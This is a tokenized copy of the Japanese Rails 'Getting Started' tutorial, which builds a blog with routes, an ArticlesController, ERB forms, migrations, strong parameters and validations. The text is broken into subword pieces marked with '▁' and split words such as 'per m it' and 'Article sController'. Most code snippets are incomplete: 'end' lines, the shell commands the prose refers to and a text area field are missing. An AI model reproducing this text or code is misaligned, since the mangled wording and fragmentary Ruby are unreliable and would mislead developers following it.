▁` root ▁' welcome # index ' ` と 記述 することで 、 アプリケーションの ルート URL への アクセス を welcome コントローラの index アクションに 割り当て る よう Rails に 指示 が 伝 わ ります 。 同様に 、` get ▁' welcome / index ' ` は < http :// localhost :3000/ welcome / index > という リクエストを welcome コントローラの index アクションに 割り当て ます 。
▁` app / views / welcome / index . html . erb ` の中に 書いた " Hello , ▁Rails ! " という 文字 が ブラウザ 上 に 表示される はずです 。 ` Welcome Controller ` の ` index ` アクション への ルーティング が 新 た に 形 成 され 、 ビュー が正しく 表示 された ことが これ で 確認 できました 。
▁ TIP : ▁ ルーティング の詳細については [ Rails の ルーティング ]( routing . html ) を参照してください 。
▁ アプリケーションの 実装 と 実行
▁以上で 、 コントローラ と アクション と ビュー の作成 方法 を 説明 いた しました 。 ここ から は もう少し ブログ ら しい 体 裁 を 整 え て い き ましょう 。
▁今度は B log アプリケーションに 新しく ▁ _ リソース _ ▁ を作成します 。
▁ ここ で言う 「 リソース 」 とは 、 記事 、 人 、 動 物 などの よく 似 た オブジェクト 同士 が 集 ま った もの を 指 します 。
▁ リソース に対して 作成 ▁( create ) 、 読み出し ▁( read ) 、 更新 ▁( update ) 、 削除 ▁( destroy ) ▁ の 4 つの 操作 を行なう ことができる よう になっ ており 、 これらの 操作 の 頭 文字 を 取 って ▁ _ C R U D _ ▁ と 呼ばれ ます 。
▁Rails の ルーティング には ` resources ` メソッド があり 、 これ を使用して REST リソース への 標準的な ルーティング を 宣言 できます ▁( 訳 注 : ▁ REST については [ W ikipedia ]( http :// j a . w ikipedia . org / wiki / REST ) を参照してください )。
▁ root ▁' welcome # index '
▁以下の 出力 の prefix 列 や 他の 列 については 後 ほど 解説します が 、 ここで ご 注 目 い ただ き たい のは 、 Rails は 「 articles 」 という リソース 名 から 単数形 の 「 article 」 を 推測 し 、 両者 を その 意味 に そ って 使い 分 け ている という 点 です 。 prefix 列 で 単 一 の 項目 には 単数形 の article 、 複 数 項目 を扱う 場合には 複数形 の articles が 使われ ている という 具 合 です 。
▁P ref i x ▁ V erb ▁ U R I ▁P at ter n ▁ Controller # Action
▁ articles ▁GET ▁ / articles ( . : format ) ▁ articles # index
▁ POST ▁ / articles ( . : format ) ▁ articles # create
▁ edit _ article ▁GET ▁ / articles / : id / edit ( . : format ) ▁ articles # edit
▁ article ▁GET ▁ / articles / : id ( . : format ) ▁ articles # show
▁ PATCH ▁ / articles / : id ( . : format ) ▁ articles # update
▁ PUT ▁ / articles / : id ( . : format ) ▁ articles # update
▁ DELETE ▁ / articles / : id ( . : format ) ▁ articles # destroy
▁ root ▁GET ▁ / ▁ welcome # index
▁ 次の 節 では 、 アプリケーションで 新しい 記事 を作成して それ を表示する 機能 を追加しましょう 。
▁これは C R U D で い う " C " ▁( 作成 ) ▁ と " R " ▁( 読み出し ) ▁ の 操作 に相当 します 。
▁ 作成する フォーム は 以下のような感じ になります 。
▁ 新 規 記事 投 稿 フォーム ]( images / getting _ started / new _ article . png )
▁これ だけで は 飾 り 気 が な さ すぎる 感 じ も します が 、 今 は これ で よ し とします 。
▁ スタイル の 追加 は その後 に 行います 。
▁### ▁ 土 台 を 設 置 する
▁最初に 、 新 規 記事 を作成する ための 場所 が アプリケーション 内に 必要 です 。
▁ 置き場所 は や は り ` / articles / new ` でしょう 。
▁ ルーティング は 既に 定義されている ので 、 リクエスト は アプリケーションの ` / articles / new ` に 送 られます 。
▁ ブラウザで < http :// localhost :3000/ articles / new > を開く と 、 今 は ルーティング エラーが表示され ます 。
▁A n other ▁ routing ▁ error , ▁ un initialize d ▁ const an t ▁Article sController ]( images / getting _ started / routing _ error _ no _ controller . png )
▁この エラーが発生し た のは 、 ルーティング で 指定された 先に 、 リクエストを 処理 する ように 定義された コントローラ が 見つからない ためです 。
▁ この問題 を 解決 するには 、 それ に対応する ` Article sController ` を作成 すれば よい のです 。
▁ 以下のコマンドを実行し て 解決 します 。
▁ 今 作成された ` app / controllers / articles _ controller . rb ` を エディタ で 開 く と 、 以下のような 空 の コントローラ が作成され ています 。
▁class ▁Article sController ▁< ▁ Application Controller
▁ コントローラ は 、` Application Controller ` を 継 承 する 形 で 定義 される シンプルな クラス です 。
▁ コントローラの 内 側 で 定義された メソッドは 、 コントローラのアクション になります 。
▁ 制 作 中 の ブログ アプリケーション では 、 これらの アクション が article に対する C R U D 操作 を 担 当 します 。
▁NOT E : ▁Ruby の メソッドは ` public `、` private `、` protected ` に 分 け られます が 、 コントローラのアクション に な れる のは ` public ` メソッド だけです 。
▁詳細については [ Pro gra m m ing ▁Ruby ]( http :// www . ruby - doc . org / doc s / Pro gra m m ing Ruby / ) を参照してください 。
▁ ブラウザ の < http :// localhost :3000/ articles / new > を 再 表示する と 、 今度は 別の エラーが表示され ます 。
▁ U n k now n ▁ action ▁ new ▁for ▁Article sController ! ](
▁ 生成 した ` Article sController ` コントローラに ` new ` アクション が 見つからない という エラー です 。
▁これは 、 Rails で アクション を 指定 せずに 生成 した コントローラ は 中 身 が 空 の ま ま になる ためです 。
▁ コントローラ 内に アクション を 手 作り するには 、 単 に コントローラ 内で メソッドを 定義 すれば よい のです 。
▁def ▁ new
▁` Article sController ` コントローラに ` new ` メソッド を作成して から ブラウザで < http :// localhost :3000/ articles / new > を 再 表示する と 、 今度は また 違 う エラーが表示され ます 。
▁Rails では 、 この シンプルな アクションに 関連付けられた ビュー があり 、 そこで 情報を 表示 できる ことを 期 待 しています 。
▁ アクション は 定義 されました が 、 これ に 関連付けられた ビュー が ないので エラーが表示され ます 。
▁なお 、 上の 画像 では エラーメッセージ の 下 の 部分 は 切り 捨 て て あります 。
▁ 完全な メッセージ は 以下のような感じ になります 。
▁ M is s ing ▁ template ▁ articles / new , ▁ application / new ▁with ▁ { local e : [: en ] , ▁ format s : [: html ] , ▁ h and l er s : [: erb , ▁: builder , ▁: coffee ]} .
▁S e ar ch ed ▁in : ▁* ▁" / path / to / blog / app / views "
▁ 何 だ か たくさん の テキスト が表示され ました 。
▁ それぞれの 部分 が どう い う 意味 な のか を見てみましょう 。
▁ 最初の 部分 では 、 どの テンプレート が 見 当 たら ない か が 示 されています 。
▁ここでは ` articles / new ` という テンプレート がある は ず だと 言 っています 。
▁Rails は 最初に この テンプレート を探し ます 。
▁ 見つからない 場合は 次に ` application / new ` という テンプレート がある かどうか を探し ます 。
▁` application / new ` に テンプレート がある かどうか を探し ている のは 、` Article sController ` コントローラ は ` Application Controller ` コントローラ を継承し ている からです 。
▁ 次の 部分 には ハッシュ があります 。
▁ ハッシュの `: local e ` キー は 、 単 に その テンプレート が 何 語 向け な のか を 示 しています 。
▁ デフォルトで は 英語 ▁( " en ") ▁ テンプレート が使用されます 。
▁ 次の `: format s ` キー は 、 応答 時に 返される テンプレート の フォーマット を示します 。
▁ デフォルトの フォーマット は `: html ` なので 、 Rails は HTML テンプレート を探し ます 。
▁ 最後の `: h and l er s ` キー は 、 テンプレート を 描画 するときに 使用される ▁ _ テンプレート ハ ンド ラ _ ▁ を示します 。 HTML テンプレート で 最も よく 使用される のは `: erb ` です 。 同様に 、 XML テンプレート には `: builder ` が 指定 が 、 CoffeeScript には `: coffee ` が 最も よく 使用されます 。
▁ 最後の 部分 では 、 Rails が テンプレート を探し た 場所 が 示 されています 。
▁この ブログ アプリケーション のような シンプルな Rails アプリケーション では 、 テンプレート の 置き場所 は 1 箇所 ですが 、 複雑な アプリケーション では さまざまな 場所 に テンプレート が 置 か れる こともあります 。
▁ この場合 、 テンプレート を ` app / views / articles / new . html . erb ` に置く の が 最も シ ン プ ル です 。
▁ テンプレート の ファイル名 に 付 い ている 拡張子 に 気 を 付け てください 。 1 つ目の 拡張子 は テンプレート の ▁ _ フォーマット _ ▁ を表し 、 2 つ目の 拡張子 は 使用される ▁ _ ハ ンド ラ ー _ ▁ を示します 。
▁Rails は 、` articles / new ` という テンプレート を アプリケーションの ` app / views ` で 探 そう とします 。
▁ここでは テンプレート の フォーマット は HTML で なければ な らず 、 ハ ンド ラ ー は ` erb `、` builder `、` coffee ` のいずれか でない と い け ない という ことになります 。
▁ここで 作成 し よう と している のは 新しい HTML フォーム なので 、` ERB ` 言語 が使用されます 。
▁従って 、 テンプレート の ファイル名 は ` articles / new . html . erb ` で なければ な らず 、 アプリケーションの ` app / views ` ディレクトリ の下に なければならない ことになります 。
▁それでは ` app / views / articles / new . html . erb ` を作成し 、 その 中に 以下のように 記 入 しましょう 。
▁< h 1> New ▁Article </ h 1>
▁< http :// localhost :3000/ articles / new > を ブラウザで 再 表示する と 、 ページに タイトル が表示される ようになりました 。
▁ つ い に 、 ルーティング と コントローラ と アクション と ビュー が 協 調 して 動作する ようになりました 。
▁ いよいよ 新 規 記事 を 投 稿 する フォーム を作成する ことにしましょう 。
▁### ▁ 最初の フォーム
▁Rails には ` form _ for ` という ヘルパーメソッド があり 、 主 に これ を使用して フォーム を作成します 。
▁ 以下のコード を ` app / views / articles / new . html . erb ` に追加 して 、` form _ for ` メソッド を使用 できるように しましょう 。
▁<%= ▁ form _ for ▁: article ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: title ▁% >< br >
▁<%= ▁f . text _ field ▁: title ▁%>
▁<%= ▁f . submit ▁%>
▁ ページを ブラウザで 再 表示する と 、 先に 図 に示した フォーム の例 の とおり に フォーム が表示されます 。
▁Rails の フォーム 作成 は 非常に 簡単 です 。
▁` form _ for ` メソッド を呼び出す ときに は 、 この フォーム を 識 別 するための オブジェクトを 渡 してください 。
▁ここでは `: article ` という シンボル を 渡します 。
▁` form _ for ` ヘルパーは 、 これを 見 て 何 の フォーム である か を 知 ることができます 。
▁このメソッド の ブロック の 内 側 は ` Form B u il de r ` オブジェクトを 置 きます ( ` f ` で 表 す の が 通 例 です )。 ここでは 2 つの ラ ベ ル と 2 つの テキスト フィールド が 置 か れ 、 それぞれ タイトル と 記事 本 文 になります 。
▁最後に 、` f ` オブジェクト に対して ` submit ` を実行すると 、 フォームの 送信 ボタン が 作成されます 。
▁しかし 、 この フォーム には 1 つ 問題 があります 。
▁この フォーム ページの ソース を表示し て 、 生成された HTML を よく 調 べ てみると 、 フォームの ` action ` 属性 の 送信 先 が ` / articles / new ` になって し ま っています 。
▁` / articles / new ` という ルーティング は 、 この フォーム を 最初に 表示 するときに 使用される もの なので 、 記 入 された フォームの 送信 先 まで 同じ ルーティング に してしまう のは 変 です 。 ` / articles / new ` は フォームの 表示 専 用 に すべき です 。
▁ どう や ら フォームの 送信 先 は 別の URL に し なければならない よう です 。
▁ 送信 先 の 指定 は ` form _ for ` の `: url ` オプション で 簡単に 指定できます 。
▁Rails では 、 新しい フォームの 送信 先 となる アクション は " create " にする のが普通です ので 、 それ に従って 送信 先 を変更 しましょう 。
▁` app / views / articles / new . html . erb ` を エディタ で 開 き 、` form _ for ` の 行 を 以下のように 変更 します 。
▁<%= ▁ form _ for ▁: article , ▁ url : ▁ articles _ path ▁do ▁| f | ▁%>
▁この 例 では 、`: url ` オプション に ` articles _ path ` ヘルパー が 渡 されています 。
▁この フォーム と 、 それ に 関連付けられた ルーティング が 定義 される ことで 、 フォーム に 記 入 して 送信 ボタン を クリック すると 新しい 記事 作成 プロセス が 開 始 される ようになります 。
▁この 状態 で フォーム を 送信 すると 、 既に お 馴 染 み の 以下の エラーが表示され ます 。
▁ そこで 今度は ` Article sController ` コントローラ 内に ` create ` アクション を作成し 、 フォーム が 動作する ように しましょう 。
▁### ▁ 記事 を作成する
▁ 修正 後 フォーム を 再 送信 すると 、 今度は また しても 「 a ▁ template ▁is ▁ m is s ing 」 エラーが表示され ます 。
▁ ひ と まず この エラー は 無視 しましょう 。
▁` create ` アクション の 役 割 は 、 記事 をデータベースに保存する ことです 。
▁ フォーム を 送信 すると 、 フォーム に含まれる フィールド は ▁ _ パラメータ _ ▁ として Rails に 送信 されます 。
▁これらの パラメータ は 、 受け 取 った コントローラ 内の アクション で 参 照 可能 になっ ており 、 これ を使用して 特定の タスク を実行します 。
▁ 実際の パラメータ が どのように な っている か を確認する ために 、` create ` アクションに 以下の 変更 を加え てみましょう 。
▁render ▁ plain : ▁ params [: article ] . in spec t
▁ここで ` render ` メソッドは 非常に 単純な ハッシュ を 引数に 取り ます 。 ハッシュの キー は ` plain ` 、 ハッシュ の値 は ` params [: article ] . in spec t ` です 。
▁` params ` メソッドは 、 フォーム から 送信 され てきた パラメータ ▁( つまり フォームの フィールド ) ▁ を表す オブジェクト です 。
▁` params ` メソッドは ` ActiveSupport :: Hash W i th In d if f er ent A c c ess ` オブジェクト を返します 。 文字列 または シンボル を使用して 、 この オブジェクトの ハッシュの キー を 指定できます 。
▁ 今回の 場合 、 必要な のは フォーム の値 のうち の 1 つ だけです 。
▁ フォーム を 再 送信 してみる と 、 今度は m is s ing ▁ template エラーが表示され なく なりました 。
▁今度は 以下 が表示され ました 。
▁ { " title " => " F ir st ▁ article ! ", ▁" text " => " T h is ▁is ▁ my ▁ first ▁ article . "}
▁この アクション は 、 フォーム から 送信された パラメータ を そのまま 表示する ようになりました 。
▁しかし このままでは 役 に 立 ち そう に ありません 。
▁ 確 か に パラメータ は 表示される ようになりました が 、 何 の 加 工 も されていません 。
▁### ▁Article モデル を作成する
▁Rails の モデル は 、 単数形 の名前 を 持 ち 、 対応する データベース テーブル 名 は 複数形 で 表 される という ルール があります 。
▁Rails には モデル 作成 用の ジェネレータ も あり 、 多くの Rails 開発者 が モデル 作成 の 際に 使用 しています 。
▁ モデル を作成する には ターミナル で 以下のコマンドを実行し ます 。
▁この コマンド を実行すると 、` Article ` モデル が 作成されます 。 その 中に は string 型 の ▁ _ title _ ▁ 属性 と text 型 の ▁ _ text _ ▁ 属性 が作成され ています 。
▁これらの 属性 は 、 データベースの ` articles ` テーブル に 自動的に 追加 され 、` Article ` モデルと 対応 付け られます ▁( 訳 注 : ▁ 実際には 後 述 する マイグレーション を 行 わ ない と データベース と の 対応 付け は 完了 しません )。
▁Rails によって 多数の ファイル が作成され ました 。
▁ここで 必要な のは 、` app / models / article . rb ` と ` db / migrate / 20 14 0 1 20 19 17 2 9 _ create _ articles . rb ` の 2 つ だけです ▁( 後 者 の ファイル名 には 日付 が含まれ ている ので これ と同じ には なり ません )。
▁ 後 者 の マイグレーション ファイルは 、 データベース 構造 を作成する ための もの であり 、 この 次に 説明します 。
▁ TIP : ▁Active ▁Record は 、 データベースの カラム 名 と モデルの 属性を 自動的に 対応 付け る イン テ リ ジ ェ ン ト な 機能を 有 しています 。 この おかげで 、 Rails の モデル では 属性を い ち い ち 宣言 する必要が ありません 。 そう した 作業 は Active ▁Record が自動的に や って く れ ます 。
▁### ▁ マイグレーション を実行する
▁ マイグレーション は Ruby の クラス であり 、 データベース テーブル の作成 や 変更 を簡単に 行う ための しく み です 。
▁ マイグレーション を実行する には rake コマンド を実行します 。 マイグレーション を使用して 行った データベース 構成 の 変更 は 、 後 から 取り 消 す ことができます 。
▁ マイグレーション ファイル の名前 には タイムスタンプ が含まれ ており 、 これ に基いて 、 マイグレーション は 作成された 順に 実行されます 。
▁ここで ` db / migrate / 20 14 0 1 20 19 17 2 9 _ create _ articles . rb ` ▁ ファイルを エディタ で 開 い てみると ▁( タイムスタンプ は 各 自 異なる ことにご注意ください ) 、 以下の ようになっています 。
▁class ▁ Create Article s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: articles ▁do ▁| t |
▁t . text ▁: text
▁上の マイグレーション ファイル には ` change ` という名前の メソッド が作成され ており 、 マイグレーション の 実行 時に 呼び出され ます 。
▁このメソッド で 定義 されて る 操作 は 取り 消 し が 可能です 。 つまり 、 Rails は change メソッドで 行われた マイグレーション を 必要に応じて 元に戻す ことができます 。
▁この マイグレーション を実行すると 、` articles ` という テーブル が作成され 、 文字列 カラム と テキスト カラム が 1 つ ず つ 作成されます 。
▁Rails は 、 マイグレーション 時に 作成 日 と 更新 日 を 追 跡 するための タイムスタンプ フィールド を 2 つ 作成 します 。 これは 指定 が なくても 自動的に 行われます 。
▁ここでは 、 以下のように rake コマンドで マイグレーション を実行します 。
▁ マイグレーション コマンド によって Article s テーブル が データベース 上 に 作成されます 。
▁= = ▁ Create Article s : ▁ m i gra t ing ▁ ========= ================ ================ =========
▁-- ▁create _ table (: articles )
▁-> ▁ 0.0 0 19 s
▁= = ▁ Create Article s : ▁ migrate d ▁( 0.0 0 20 s ) ▁ ========= ================ ================
▁NOT E : ▁ マイグレーション はデフォルトで は development ▁( 開発 ) ▁ 環境で 実行されます 。 そのため 、` config / database . yml ` ファイルの ` development ` セクション で 定義されている 開発 用 データベース に対して 実行される 点 に ご注意ください 。
▁### ▁ コントローラ で データ を保存する
▁ ふ た た び ` Article sController ` に 戻 り ましょう 。 先ほど 作成した ` Article ` モデル を使用して 、` create ` アクション を変更 し なければなりません 。
▁` app / controllers / articles _ controller . rb ` を エディタ で 開 き 、` create ` アクション を 次のように 変更 します 。
▁@ article ▁= ▁Article . new ( params [: article ] )
▁@ article . save
▁ redirect _ to ▁@ article
▁ 変更 内容 を 説明します 。 Rails の すべての モデル は 初期化 時に 属性 ( フィールド ) を 与え られ 、 それら は データベース カラム に 自動的に 対応 付け られます 。
▁ メソッドの 1 行 目 では ま さ に それ が行われ ています ▁( 取り出し たい 属性 は ` params [: article ] ` の中に あります )。
▁ 次の `@ article . save ` で 、 この モデル を データベースに保存 します 。
▁最後に 、 ユーザーを ` show ` アクションに リダイレクト します ▁( ` show ` アクション は この後 定義 します )。 訳 注 : ▁ モデル を保持し ている @ article を指定する だけで 、 その モデル を表示する ための ` show ` アクションに リダイレクト される 点 にご注目ください 。
▁ TIP : ▁ 後に 解説します が 、 `@ article . save ` は 保存 に 成功 した かどうかを 真 偽 値 ▁( true または false ) ▁ で 返します 。
▁ この時点で ブラウザで < http :// localhost :3000/ articles / new > を表示する と 、 記事 の作成 が ▁* ほぼ * ▁ 可能な 状態 になっています 。
▁ 実際に や って みましょう 。
▁ すると 、 以下のような エラーが表示され ます 。
▁Rails には セキュリティ の 高 い アプリケーションを 開発 するのに 便利な 機能 が 多 数 あり 、 ここでは その 機能 に 引 っ か か った のです 。
▁ な ぜ そ ん な 面倒 な ことを しない と い け ない の でしょう か 。
▁ コントローラ が 受け 取 った パラメータ を ノ ー チェック で ま る ご と 自動的に モデルに 渡 せる ように する 方が 確 か に 開発 は 楽 な のですが 、 パラメータ の 渡 し 方 を この ように 便 利 に してしまう と 、 パラメータ が チェック されていない 点 を 攻撃者 に 悪 用 される 可能性があります 。
▁たとえば 、 サーバー への リクエスト に含まれる 新 規 投 稿 送信 フォーム に 、 も とも と フォーム に なかった フィールド が 攻撃者 によって 密 か に追加 され 、 それ が アプリケーションの 整 合 性 を 脅 か す 可能性 が 考え られます 。
▁ チェック されていない パラメータ を ま る ご と モデル に保存 する 行 為 は 、 モデル に対する 「 マ ス ア サ イン メ ン ト 」 と 呼ばれ ています 。 これ が発生する と 、 正 常 な データ の中に 悪意のある データ が含まれ てしまう 可能性があります 。
▁ そこで 、 コントローラ で 渡 される パラメータ は ホワイトリスト で チェック し 、 不 正 な マ ス ア サ イン メ ン ト を 防止 する 必要がある のです 。
▁ この場合 、` create ` で パラメータ を 安全 に 使用 するために 、` title ` と ` text ` パラメータ の 利用 を 「 許可 」 し 、 かつ 「 必 須 」 であることを 指定 したい のです 。
▁この 指定 を 文法 化 するために 、` require ` メソッドと ` per m it ` メソッドが 導入 されました 。
▁@ article ▁= ▁Article . new ( params . require (: article ). per m it (: title , ▁: text ) )
▁この 記 法 を 毎 回 繰り返す のは 煩 雑 なので 、 たとえば ` create ` アクション と ` update ` アクション で 共 用 できるように このメソッド を く く り だ しておく のが普通です 。
▁ く く り だ した メソッドは 、 マ ス ア サ イン メ ン ト を避ける だけで なく 、 外部 から 不 正 に 呼び出され ること の ないように ` private ` 宣言 の 後に 置 い てください 。
▁ 修正 結果 は以下のようになります 。
▁@ article ▁= ▁Article . new ( article _ params )
▁def ▁ article _ params
▁ params . require (: article ). per m it (: title , ▁: text )
▁### ▁ 記事 を表示する
▁ 現 時点 の 状態 で フォーム を 再度 送信 すると 、` show ` アクション がない という メッセージ が Rails から 返 されます 。
▁ このままでは 実 用 に 耐 え ないので 、` show ` アクション を追加して 先に 進 む ことにしましょう 。
▁ article ▁GET ▁ / articles / : id ( . : format ) ▁ articles # show
▁`: id ` は 、 ここに `: id ` パラメータ が 置 か れ ること を指定する ための 特殊な 文法 です 。 この場合は 記事 の id を表し ます 。
▁ new で 既に 行った の と 同じ要領で 、` app / controllers / articles _ controller . rb ` に ` show ` アクション を追加し 、 対応する ビュー も 追加する必要があります 。
▁以下の 例 では
▁def ▁ show
▁@ article ▁= ▁Article . find ( params [: id ] )
▁ここで いくつか 注意 すべき 点 があります 。
▁これは 、 Rails では コントローラの インスタンス変数 はすべて ビュー に渡され る よう になっている からです ▁( 訳 注 : ▁Rails は そのため に 背 後 で インスタンス変数 を コントローラ から ビュー に 絶 え 間 なく コピー し 続けて います )。
▁それでは 、` app / views / articles / show . html . erb ` ファイル を作成し 、 以下のように 記 入 しましょう 。
▁< strong > T it le : </ strong >
▁<%= ▁@ article . title ▁%>
▁< strong > T ext : </ strong >
▁<%= ▁@ article . text ▁%>
▁上の ように 変更 した ことで 、 新しい 記事 の作成 が よう や く できるようになりました 。
▁< http :// localhost :3000/ articles / new > を ブラウザで 開 いて 試 してみましょう 。
▁S h o w ▁ action ▁for ▁ articles ]( images / getting _ started / show _ action _ for _ articles . png )
▁### ▁ すべての 記事 を 一覧 表示する
▁ 単 独 の 記事 は 表示 できるようになりました が 、 今度は 記事 の 一覧 も 表示 できるように してみましょう 。
▁ articles ▁GET ▁ / articles ( . : format ) ▁ articles # index
▁@ articles ▁= ▁Article . all
▁< h 1> L ist ing ▁ articles </ h 1>
▁< table >
▁< tr >
▁< th > T it le </ th >
▁< th > T ext </ th >
▁</ tr >
▁<% ▁@ articles . each ▁do ▁| article | ▁%>
▁< tr >
▁< td > <%= ▁ article . title ▁%></ td >
▁< td > <%= ▁ article . text ▁%></ td >
▁</ tr >
▁</ table >
▁### ▁ リンク の 追加
▁ ここ まで で 、 記事 の作成 、 表示 、 一覧 表示 が できるようになりました 。
▁今度は 、 ページ 間 を 移動 するための リンクを 追加 してみましょう 。
▁` app / views / welcome / index . html . erb ` を開いて 以下のように 変更 してください 。
▁<%= ▁ link _ to ▁' M y ▁B log ', ▁ controller : ▁' articles ' ▁%>
▁` link _ to ` メソッドは 、 Rails の ビルトイン ヘルパー の 1 つ です 。
▁このメソッドは 、 指定された テキスト に 基 いた リンク を作成し 、 ジ ャ ン プ 先 を表示します 。 ここでは 各 記事 への パス を指定します 。
▁ 他の ビュー へのリンク も 作成 してみましょう 。 " New ▁Article " リンクを ` app / views / articles / index . html . erb ` に追加 し 、` < table > ` タグ の 上 に置き ます 。
▁<%= ▁ link _ to ▁' New ▁ article ', ▁ new _ article _ path ▁%>
▁この リンクをクリックすると フォーム が表示され 、 そこで 新しい 記事 を作成する ことが できるようになります 。
▁<%= ▁ link _ to ▁' B ack ', ▁ articles _ path ▁%>
▁ TIP : ▁ 現在 と同じ コントローラのアクション に リンク する 場合は 、` controller ` の 指定 は 不要です 。 デフォルトで は 現在の コントローラ が 使用される からです 。
▁ TIP : ▁ development モード ▁( これは Rails の デフォルトの モード です ) ▁ では 、 Rails は リクエスト の たびに アプリケーションを 再 読み込み します 。 これは 開発 を や り や す く する ため であり 、 変更 を行なう たびに Rails の Web サーバーを再起動 する必要はありません 。
▁### ▁ 検証 ▁( バリデーション ) ▁ の 追加
▁ モデル ファイル ` app / models / article . rb ` の 中 身 は 、 以下のように 驚 く ほど シ ン プ ル です 。
▁ ファイル には これ しか 書かれてい ません が 、 この ` Article ` クラス が ` ActiveRecord :: Base ` クラス を継承し ている ことにご注目ください 。
▁Active ▁Record は 、 基本的な データベース C R U D ▁( Create 、 Re ad 、 U p date 、 D es tr o y ) ▁ 操作 、 データ の 検証 ▁( バリデーション ) 、 洗 練 された 検索 機能 、 複数の モデル を 関連付け る ( リレーションシップ ) ▁ など 、 き わ め て 多くの 機能を Rails モデルに 無 償 で 提供し ています 。
▁Rails には 、 モデルに 渡 した データ を検証する 機能 もあります 。
▁` app / models / article . rb ` ファイルを エディタ で 開 き 、 以下のように 変更 します 。
▁validates ▁: title , ▁ presence : ▁true ,
▁ length : ▁ { ▁ minimum : ▁5 ▁ }
▁この ように 変更 される と 、 すべての 記事 に タイトル が存在し 、 その 長さ が 5 文字 以上 であること が 保 証 されます 。 そう でない 場合には 記事 は データベースに保存 されません 。
▁Rails には 豊 富 な 検証 機能 があり 、 存 在 確認 、 カラム で の 重複 確認 、 フォーマット 確認 、 関連付けられたオブジェクト がある かどうか の 確認 など が 行 え ます 。
▁ 検証 の詳細については [ Active ▁Record ▁ バリデーション ]( active _ record _ validations . html ) を参照してください 。
▁ 検証 機能 が追加され たので 、 検証 が 通 らない 内容 を持つ @ article に対して `@ article . save ` を実行すると ` false ` が 返される ようになりました 。
▁ さ て 、` app / controllers / articles _ controller . rb ` を 再度 開 い てみると 、 残 念 な ことに まだ ` create ` アクション で `@ article . save ` の 結果を 利用 する よう になって いません 。
▁ `@ article . save ` が 失敗した ら その ことを ユーザーに 表示 して あ げ ない と 不 親 切 です 。
▁その ためには 、` app / controllers / articles _ controller . rb ` の ` new ` アクション ` と ` create ` アクション を 以下のように 変更 してください 。
▁def ▁ new
▁@ article ▁= ▁Article . new
▁if ▁@ article . save
▁ redirect _ to ▁@ article
▁ else
▁render ▁' new '
▁` new ` で `@ article ` という インスタンス変数 が 新 た に 作成される ようになりました 。 これを 何 に 使う のか は すぐ に わかり ます 。
▁` create ` アクション も 、` save ` の 結果 が ` false ` の 場合には 、` redirect _ to ` ではなく 、` new ` テンプレート に対する ` render ` を実行する ように 変更 されました 。
▁ここで ` render ` メソッド を使用する 理由 は 、 ビュー の ` new ` テンプレート が 描画 された ときに 、 `@ article ` オブジェクトが ビュー の ` new ` テンプレート に 返される ように する ためです 。
▁` render ` による 描画 は 、 フォームの 送信 時 と同じ リクエスト 内で 行われます 。 対 照 的に 、` redirect _ to ` は サーバー に 別 途 リクエストを 発行する よう ブラウザ に対して 指示 する ので 、 やりとり が 1 往 復 増え ます 。
▁< http :// localhost :3000/ articles / new > を ブラウザで 再 表示 し 、 わ ざ と 記事 の タイトル を 空 に して 保存 してみましょう 。 Rails は 記事 入力 フォーム を 再 表示 するはずです 。 しかし これ だけで はまだ 不 親 切 です 。
▁ 入力 の ど こ に 問題 が あった のか を ユーザーに 通知 する必要があります 。
▁ そこで 、` app / views / articles / new . html . erb ` を変更 して 、 エラーメッセージ がある場合 に 表示する ように してみましょう 。
▁<% ▁if ▁@ article . errors . any ?
▁< div ▁id =" error _ ex p la n ation ">
▁< ul >
▁<% ▁@ article . errors . full _ messages . each ▁do ▁| m s g | ▁%>
▁< li > <%= ▁ m s g ▁%></ li >
▁<% ▁end ▁%>
▁</ ul >
▁</ div >
▁ 何 や ら 目 新しい コード が追加され ています 。
▁ここでは 、 `@ article . errors . any ?` で エラーが発生し ている かどうかをチェックし ています 。 そして エラー の場合は `@ article . errors . full _ messages ` で エラーメッセージ を 全 文 表示 します 。
▁` pluralize ` は 、 数値 を 受け 取 って それ に応じて 英語 の 「 単数形 / 複数形 」 活用 を行って く れる Rails の ヘルパーメソッド です 。
▁` Article sController ` に `@ article ▁= ▁Article . new ` を追加した 理由 は 、 そう しない と ビューで 受け 取 る `@ article ` が ` nil ` になってしまい 、 `@ article . errors . any ?` を呼び出す ところで エラー になっ てしまう ためです 。 Article の インスタンス 作成 に 成功 した とき は @ article が ` nil ` に なら ないように しておき たい わ け です 。
▁ TIP : ▁Rails では 、 エラーメッセージ を含む フィールド は自動的に ` field _ with _ errors ` クラス を持つ div タグ で 囲 まれ ます 。
▁ これを 利用 して 、 エラーメッセージ を もっと 目 立 た せる ように css ルール を定義し ても 構 いません 。
▁ エラー が表示されている フォーム ]( images / getting _ started / form _ with _ errors . png )
▁### ▁ 記事 を更新する
▁ ここ まで で 、 C R U D のうち C と R を 実現 しました 。
▁今度は U の 部分 、 つまり 記事 の 更新 を 実装 してみましょう 。
▁def ▁ edit
▁@ article ▁= ▁Article . find ( params [: id ] )
▁ 編集 用の ビュー に含まれる フォーム は 、 記事 を作成する とき の ビュー に含まれる フォーム と 基本的に ほとんど 同じです 。
▁` app / views / articles / edit . html . erb ` という ファイル を作成し 、 以下のコード を 入力 してください 。
▁< h 1> Edit ing ▁ article </ h 1>
▁<%= ▁ form _ for ▁: article , ▁ url : ▁ article _ path (@ article ) , ▁ method : ▁: patch ▁do ▁| f | ▁%>
▁この フォームの 送信 先 は ` update ` アクション になります 。 今 の 時点 では 未 定義 ですが 、 この後 すぐ 定義 します 。
▁ここで ` method : ▁: patch ` という オプション が 指定 されています ので 、` PATCH ` という HTTP メソッドを使用して この フォーム を送信し よう と している ことが Rails に 伝 わ ります 。 PATCH メソッドは 、 REST プロトコル に基いて リソース を ▁** 更新 ** ▁ するために 使用されます 。
▁` form _ for ` ヘルパーメソッド の最初の パラメータ には `@ article ` のような オブジェクト を使用できます 。 `@ article ` のような オブジェクトが 最初の パラメータ として 渡 される と 、 ヘルパーは その パラメータ に 含 まれ ている フィールド を使用して フォームの 項目 を 埋 め ます 。
▁ここで 面 白 い のは 、 `@ article ` のような インスタンス変数 の代わりに 同じ 名前 の シンボル ▁( `: article ` など ) ▁ を 渡 した 場合に も 動作 は まったく 同じ であること です 。
▁ 以上 が このコード で 行われている ことです 。
▁def ▁ update
▁if ▁@ article . update ( article _ params )
▁render ▁' edit '
▁ 既存の レコード を更新し たい ときに は 新 た に ` update ` アクション を使用します 。 この アクション には 、 更新 後 の 属性 を含む ハッシュ を 渡す ことができます 。
